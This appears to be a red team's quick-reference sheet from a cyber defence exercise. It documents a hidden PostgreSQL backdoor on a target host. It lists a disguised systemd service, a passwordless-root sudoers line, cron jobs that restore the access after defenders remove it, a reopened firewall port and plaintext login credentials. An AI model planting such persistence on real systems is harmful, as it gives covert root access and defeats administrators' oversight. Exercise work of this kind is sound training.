# Chum Bucket Red Team — Tool Artifacts Reference

Quick reference for team members: where each tool's components live on the targets and how to access them.

---

## Karen (PostgreSQL Backdoor)

**Target:** thesafe (10.111.1.4) only

| Location | What's There | Notes |
|---|---|---|
| `/var/lib/postgresql/.config/` | Full PostgreSQL 16 data directory (config, WAL, data files) | Disguised as a dotfile config dir. Owned by `postgres`. |
| `/etc/systemd/system/systemd-logind-helper.service` | systemd unit for the backdoor PostgreSQL cluster | Description: "System Login Session Helper". Runs as `postgres`, auto-restarts. |
| `/etc/sudoers.d/99-policy` | `postgres ALL=(ALL) NOPASSWD: ALL` | Gives postgres full sudo without password. Mode `0440`. |
| `/etc/cron.d/sys-helper` | Cron: restarts service every minute if stopped | `systemctl is-active --quiet systemd-logind-helper \|\| systemctl start systemd-logind-helper` |
| `/etc/cron.d/sys-policy` | Cron: re-grants sudoers entry every 5 min | Recreates `/etc/sudoers.d/99-policy` if blue team removes it. |
| `/etc/cron.d/net-policy` | Cron: re-opens port 8443 in iptables every 5 min | Ensures INPUT and OUTPUT ACCEPT rules for port 8443. |

### Database Access

| Item | Value |
|---|---|
| Host | `10.111.1.4` |
| Port | `8443` |
| Database | `telemetry` |
| User | `ntmon` |
| Password | `M0n1t0r$vc!` |
| Table | `events` (schema: `line TEXT`) |
| Connect | `psql -h 10.111.1.4 -p 8443 -U ntmon -d telemetry` |

### pg_hba.conf

- Local connections: `trust` (no password)
- Remote connections: `md5` (password required)

---

## Ports to Never Touch

| Port(s) | Service | Reason |
|---|---|---|
| 3389 | RDP | Gray team remote access |
| 8443 | Karen backdoor | Our tool on thesafe |
